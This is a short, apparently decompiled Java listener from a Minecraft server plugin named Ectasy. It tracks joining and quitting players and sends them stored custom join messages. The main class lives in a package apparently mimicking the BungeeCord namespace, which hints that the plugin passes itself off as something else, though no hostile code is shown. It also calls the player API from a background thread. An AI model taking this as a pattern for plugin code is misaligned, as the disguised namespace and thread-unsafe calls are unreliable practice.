package fr.body.ectasy.listeners;

import fr.body.ectasy.command.impl.MsgJoinCommand;
import fr.body.ectasy.user.User;
import net.md5.bungee.Ectasy;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;

public class UserListAddListener implements Listener {
   @EventHandler
   public void onQuitEvent(PlayerQuitEvent var1) {
      Ectasy.users.remove(var1.getPlayer().getName());
   }

   @EventHandler
   public void onJoinEvent(PlayerJoinEvent var1) {
      Ectasy.users.putIfAbsent(var1.getPlayer().getName(), new User(var1.getPlayer()));
      if (MsgJoinCommand.joinMessages.containsKey(var1.getPlayer().getName())) {
         new Thread(() -> {
            try {
               Thread.sleep(10L);
            } catch (InterruptedException var2) {
               var2.printStackTrace();
            }

            var1.getPlayer().sendMessage(MsgJoinCommand.joinMessages.get(var1.getPlayer().getName()).replace("&", "§"));
         }).start();
      }
   }
}
